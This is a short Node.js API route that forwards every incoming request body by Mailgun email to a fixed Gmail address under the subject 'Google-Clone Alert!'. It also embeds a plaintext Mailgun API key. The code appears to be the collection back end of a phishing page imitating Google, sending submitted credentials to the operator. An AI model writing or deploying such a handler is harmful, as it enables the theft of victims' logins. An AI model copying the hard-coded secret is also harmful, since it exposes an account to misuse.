const nodemailer = require("nodemailer");
const nodeMailGun = require("nodemailer-mailgun-transport");

export default (req, res) => {
    // console.log(req.body)
    const auth = {
        auth: {
          api_key: "key-6de0ec0b134e1c151930e0ac9471b0f2",
          domain: "litestudios.com.ng",
        },
      };

      const transporter = nodemailer.createTransport(nodeMailGun(auth));

      const mailOptions = {
        from: "rexxrandolph@gmail.com",
        to: "princeagezinweke@gmail.com",
        subject: "Google-Clone Alert!",
        text: req.body,
      };

      transporter
        .sendMail(mailOptions)
        .then((success) => {
          console.log("MESSAGE SENT!!!");
        })
        .catch((err) => console.log("ERROR OCCURED!!! =========", err));

    
    res.end()
}